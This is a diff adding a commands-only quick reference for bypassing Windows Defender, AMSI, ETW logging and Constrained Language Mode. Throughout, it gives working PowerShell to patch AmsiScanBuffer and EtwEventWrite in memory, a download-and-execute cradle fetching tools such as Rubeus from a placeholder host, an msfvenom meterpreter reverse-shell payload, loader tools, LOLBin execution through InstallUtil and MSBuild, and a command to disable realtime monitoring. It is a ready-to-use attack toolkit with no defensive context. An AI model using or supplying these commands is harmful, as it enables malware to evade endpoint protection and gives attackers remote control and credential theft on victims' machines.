@@ -1,0 +1,61 @@
+# AV / AMSI Bypass — Quick Reference (commands only)
+
+## Defender Recon
+Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IsTamperProtected
+Get-MpPreference | Select ExclusionPath,ExclusionExtension,ExclusionProcess
+
+## AMSI Bypass — reflection (obfuscated)
+$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
+$f=$a.GetField('am'+'siIni'+'tFailed','NonPublic,Static')
+$f.SetValue($null,$true)
+
+## AMSI Bypass — memory-patch AmsiScanBuffer
+$Win32 = @"
+using System;using System.Runtime.InteropServices;
+public class Win32{
+[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
+[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);
+}
+"@
+Add-Type $Win32
+$addr=[Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"),"AmsiScanBuffer")
+$p=0;[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
+[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$addr,6)
+
+## AMSI Bypass — PS v2 downgrade
+powershell -version 2
+
+## ETW Patch (for .NET Assembly.Load)
+$ntdll=[Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"),"EtwEventWrite")
+$p=0;[Win32]::VirtualProtect($ntdll,[uint32]1,0x40,[ref]$p)
+[Runtime.InteropServices.Marshal]::WriteByte($ntdll,0xC3)
+
+## In-Memory Execution — IEX cradle
+IEX(New-Object Net.WebClient).DownloadString('http://<ip>/tool.ps1')
+
+## In-Memory Execution — Assembly.Load
+$bytes = (New-Object Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')
+[Reflection.Assembly]::Load($bytes)
+[Rubeus.Program]::Main("kerberoast".Split())
+
+## On-Disk Evasion — ScareCrow
+ScareCrow -I payload.bin -Loader dll -domain <legit-domain.com>
+
+## On-Disk Evasion — donut (.NET → shellcode)
+donut -i Rubeus.exe -o rubeus.bin
+
+## On-Disk Evasion — msfvenom raw (wrap in custom loader)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o payload.bin
+
+## CLM Check
+$ExecutionContext.SessionState.LanguageMode
+
+## CLM Bypass — InstallUtil
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
+
+## CLM Bypass — MSBuild
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+## Disable Defender (admin + tamper protection OFF)
+Set-MpPreference -DisableRealtimeMonitoring $true
